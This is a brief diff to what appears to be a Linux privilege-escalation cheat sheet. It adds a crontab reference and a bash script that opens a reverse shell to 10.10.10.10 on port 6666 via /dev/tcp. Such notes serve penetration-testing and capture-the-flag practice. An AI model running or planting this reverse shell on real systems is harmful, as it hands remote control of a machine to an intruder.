@@ -57,3 +57,9 @@ openssl passwd -1 -salt <salt> <password> - generate salted hash for a new passw
 su <new account> - change account
 
 getcap -r / - list enabled capabilities
+/etc/crontab
+
+#sh file content to execute reverse shell without nc
+#!/bin/bash
+
+bash -i >& /dev/tcp/10.10.10.10/6666 0>&1
